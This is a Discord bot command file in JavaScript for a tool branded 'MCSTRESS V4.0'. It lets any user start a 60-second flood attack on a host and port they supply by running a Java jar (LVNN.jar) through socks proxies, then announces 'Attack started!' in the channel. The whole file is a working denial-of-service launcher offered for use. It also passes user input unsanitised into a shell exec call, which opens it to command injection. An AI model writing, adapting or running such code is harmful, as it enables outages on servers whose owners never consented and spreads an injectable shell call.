const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LVNN.jar ${host}:${port} 10000 1 LVNN socks_proxies.txt s4`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **MCSTRESS V4.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: LVNN 💥** \n \n ► Attack started! ✅ \n ► For 60 seconds!! 🕒 \n ☆ Flood by MCSTEAM ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['lvnn'],
  permLevel: 0
}

exports.help = {
  name: 'lvnn',
  description: 'Özel',
  usage: 'lvnn'
}